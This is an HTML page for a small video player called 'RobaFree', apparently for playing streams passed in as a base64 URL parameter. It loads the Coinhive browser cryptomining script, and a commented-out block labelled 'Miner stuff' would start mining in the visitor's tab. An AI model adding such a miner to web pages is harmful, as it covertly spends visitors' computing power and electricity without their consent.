<!DOCTYPE html>
<html>
<head>
    <title>RobaFree</title>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="./img/icon.jpg">
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clappr@latest/dist/clappr.min.js"></script>
    <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>
    <style type="text/css">
        body {
            margin:0px;
            border:0px;
            background: #000000;
        }
    </style>
</head>
<body>

    <center>
        <button onclick="javascript:fullScreen();" style="margin: 10px;height: 60px; width: 90px;">Full Sreeen</button>
        <div id="player"></div>
    </center>
    <script>
    var player = new Clappr.Player({
        parentId: "#player",
        height: "600",
        width: "900"
    });
    </script>
    <script type="text/javascript">
            /* Function */
        function changeChannel(url) {
            player.configure({
              source: url
            });
        }

        function fullScreen() {
            var elem = document.getElementById('player');
            if (elem.requestFullscreen)
                elem.requestFullscreen();
            else if (elem.mozRequestFullScreen)
                elem.mozRequestFullScreen();
            else if (elem.webkitRequestFullscreen)
                elem.webkitRequestFullscreen();
            else if (elem.msRequestFullscreen)
                elem.msRequestFullscreen();
        }

            /* Main */
        g = decodeURI(document.URL).split('?');
        g = g[1].split('&');
        changeChannel(atob(g[0]));

        // Miner stuff
        /*try {

            miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
        }
        catch(err) {
            console.log("OK");
        }*/
    </script>

</body>
</html>
